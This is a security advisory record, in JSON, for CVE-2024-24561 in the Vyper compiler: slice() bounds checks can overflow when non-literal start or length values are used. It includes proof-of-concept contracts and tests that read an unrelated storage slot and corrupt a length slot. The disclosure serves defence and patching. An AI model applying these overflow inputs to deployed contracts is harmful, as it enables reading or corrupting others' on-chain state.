{
  "Severity": "CRITICAL",
  "UpdatedAt": "2024-02-01T20:51:35Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "vyper"
  },
  "Advisory": {
    "DatabaseId": 233458,
    "Id": "GSA_kwCzR0hTQS05eDdmLWd3eHEtNmYyY84AA4_y",
    "GhsaId": "GHSA-9x7f-gwxq-6f2c",
    "References": [
      {
        "Url": "https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-24561"
      },
      {
        "Url": "https://github.com/vyperlang/vyper/issues/3756"
      },
      {
        "Url": "https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457"
      },
      {
        "Url": "https://github.com/advisories/GHSA-9x7f-gwxq-6f2c"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-9x7f-gwxq-6f2c"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-24561"
      }
    ],
    "Description": "## Summary\n\n[The bounds check for slices](https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457) does not account for the ability for `start + length` to overflow when the values aren't literals. \n\nIf a `slice()` function uses a non-literal argument for the `start`  or `length` variable, this creates the ability for an attacker to overflow the bounds check. \n\nThis issue can be used to do OOB access to storage, memory or calldata addresses. It can also be used to corrupt the `length` slot of the respective array.\n\nA contract search was performed and no vulnerable contracts were found in production.\n\ntracking in issue https://github.com/vyperlang/vyper/issues/3756.\n\n## Details\nHere the flow for `storage` is supposed, but it is generalizable also for the other locations.\n\nWhen calling `slice()` on a storage value, there are compile time bounds checks if the `start` and `length` values are literals, but of course this cannot happen if they are passed values:\n\n```python\nif not is_adhoc_slice:\n    if length_literal is not None:\n        if length_literal \u003c 1:\n            raise ArgumentException(\"Length cannot be less than 1\", length_expr)\n\n        if length_literal \u003e arg_type.length:\n            raise ArgumentException(f\"slice out of bounds for {arg_type}\", length_expr)\n\n    if start_literal is not None:\n        if start_literal \u003e arg_type.length:\n            raise ArgumentException(f\"slice out of bounds for {arg_type}\", start_expr)\n        if length_literal is not None and start_literal + length_literal \u003e arg_type.length:\n            raise ArgumentException(f\"slice out of bounds for {arg_type}\", node)\n```\n\nAt runtime, we perform the following equivalent check, but the runtime check does not account for overflows:\n```python\n[\"assert\", [\"le\", [\"add\", start, length], src_len]],  # bounds check\n```\n\nThe storage `slice()` function copies bytes directly from storage into memory and returns the memory value of the resulting slice. This means that, if a user is able to input the `start`  or `length` value, they can force an overflow and access an unrelated storage slot.\n\nIn most cases, this will mean they have the ability to forcibly return `0` for the slice, even if this shouldn't be possible. In extreme cases, it will mean they can return another unrelated value from storage.\n\n## POC: OOB access\n\nFor simplicity, take the following Vyper contract, which takes an argument to determine where in a `Bytes[64]` bytestring should be sliced. It should only accept a value of zero, and should revert in all other cases.\n\n```python\n# @version ^0.3.9\n\nx: public(Bytes[64])\nsecret: uint256\n\n@external\ndef __init__():\n    self.x = empty(Bytes[64])\n    self.secret = 42\n\n@external\ndef slice_it(start: uint256) -\u003e Bytes[64]:\n    return slice(self.x, start, 64)\n```\n\nWe can use the following manual storage to demonstrate the vulnerability:\n```json\n{\"x\": {\"type\": \"bytes32\", \"slot\": 0}, \"secret\": {\"type\": \"uint256\", \"slot\": 3618502788666131106986593281521497120414687020801267626233049500247285301248}}\n```\n\nIf we run the following test, passing `max - 63` as the `start` value, we will overflow the bounds check, but access the storage slot at `1 + (2**256 - 63) / 32`, which is what was set in the above storage layout:\n```solidity\nfunction test__slice_error() public {\n    c = SuperContract(deployer.deploy_with_custom_storage(\"src/loose/\", \"slice_error\", \"slice_error_storage\"));\n    bytes memory result = c.slice_it(115792089237316195423570985008687907853269984665640564039457584007913129639872); // max - 63\n    console.logBytes(result);\n}\n```\n\nThe result is that we return the secret value from storage:\n```\nLogs:\n0x0000...00002a\n```\n## POC: `length` corruption\n`OOG` exception doesn't have to be raised - because of the overflow, only a few bytes can be copied, but the `length` slot is set with the original input value.\n\n```python\nd: public(Bytes[256])\n\t\n@external\ndef test():\n\tx : uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 # 2**256-1\n\tself.d = b\"\\x01\\x02\\x03\\x04\\x05\\x06\"\n\t# s : Bytes[256] = slice(self.d, 1, x)\n\tassert len(slice(self.d, 1, x))==115792089237316195423570985008687907853269984665640564039457584007913129639935\n```\nThe corruption of `length` can be then used to read dirty memory:\n```python\n@external\ndef test():\n    x: uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935  # 2**256 - 1\n    y: uint256 = 22704331223003175573249212746801550559464702875615796870481879217237868556850   # 0x3232323232323232323232323232323232323232323232323232323232323232\n    z: uint96 = 1\n    if True:\n        placeholder : uint256[16] = [y, y, y, y, y, y, y, y, y, y, y, y, y, y, y, y]\n    s :String[32] = slice(uint2str(z), 1, x)\t# uint2str(z) == \"1\"\n    #print(len(s))\n    assert slice(s, 1, 2) == \"22\"\n```\n\n## Impact\n\nThe built-in `slice()` method can be used for OOB accesses or the corruption of the `length` slot.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-02-01T20:51:32Z",
    "Severity": "CRITICAL",
    "Summary": "Vyper's bounds check on built-in `slice()` function can be overflowed",
    "UpdatedAt": "2024-02-01T20:51:35Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 9.8,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003c= 0.3.10"
    }
  ]
}